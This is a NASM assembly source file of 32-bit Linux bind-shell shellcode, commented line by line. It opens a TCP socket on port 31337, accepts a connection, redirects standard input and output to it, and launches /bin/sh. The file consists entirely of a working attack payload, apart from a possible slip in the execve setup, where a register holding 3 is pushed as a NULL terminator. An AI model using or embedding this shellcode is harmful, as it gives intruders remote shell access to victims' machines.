BITS 32 ;

; s = socket( 2, 1, 0)
push BYTE 0x66      ; socketcall = #102 = 0x66
pop  eax            ; put 102 in EAX
cdq                 ; zero out EDX
xor  ebx,ebx        ; zero out EBX
inc  ebx            ; EBX = 1 SYS_SOCKET = socket()
push edx            ; build arg array = { protocol    = 0
push BYTE 0x1       ; (in reverse)        SOCK_STREAM = 1
push BYTE 0x2       ;                     AF_INET     = 2 }
mov  ecx,esp        ; ecx = ptr to argv[]
int  0x80           ; syscall , after this EAX has 'sockfd'

mov  esi,eax        ; save sockfd in ESI for later use

; bind( s, [2,31337,0], 16)
push BYTE 0x66      ; socketcall = #102 - 0x66
pop  eax            ; put 102 in EAX
inc  ebx            ; EBX = 2 = SYS_BIND = bind()
push edx            ; build sockaddr struct:{ INADDR_ANY = 0
push WORD 0x697a    ;                         PORT       = 31337
push WORD bx        ;                         AF_INET    = 2 }
mov  ecx,esp        ; ECX is ptr to struct
push BYTE 16        ; argv : { sizeof(struct) = 16
push ecx            ;          struct pointer
push esi            ;          sockfd }
mov  ecx,esp        ; ECX = argv[]
int  0x80           ; Syscall , EAX = 0 on success

; listen( s, 4)
mov  BYTE al,0x66   ; socketcall #102
inc  ebx            ; EBX = 3
inc  ebx            ; EBX = 4 SYS_LISTEN = listen()
push ebx            ; argv { backlog = 4
push esi            ;        sockfd }
mov  ecx,esp        ; ECX is ptr to argv[]
int  0x80           ; syscall

; accept( s, 0, 0)
mov  BYTE al,0x66   ; socketcall #102
inc  ebx            ; EBX = 5 SYS_ACCEPT = accept()
push edx            ; argv { socklen      = 0
push edx            ;        sockaddr ptr = NULL
push esi            ;        sockfd }
mov  ecx,esp        ; ecx = argv[]
int  0x80           ; eax = connected sockfd

; dup2 ( old sockfd, new fd )
mov  ebx,eax            ; Sockfd to EBX
xor  eax,eax            ; Zero EAX
xor  ecx,ecx            ; ECX = 0 = std in
dup_loop:
    mov  BYTE al,0x3f    ; dup2 syscall #63
    int  0x80            ; dup2( c, 0)
    inc  ecx             ; ECX++
    cmp  BYTE cl,2       ; compare ECX with 2
    jle  dup_loop        ; if ECX <= 2 jump to dup_loop

; execve ( filename, argv[], envp[] )
mov  BYTE al,11     ; syscall 11 execve()
push edx            ; push 0 for NULL termination
push 0x68732f2f     ; push //sh
push 0x6e69622f     ; push /bin
mov  ebx,esp        ; EBX has a ptr to /bin//sh
push ecx            ; push NULL terminator
mov  edx,esp        ; EDX = NULL
push ebx            ; string ptr to top
mov  ecx,esp        ; ECX has the arg ptr
int  0x80           ; call execve
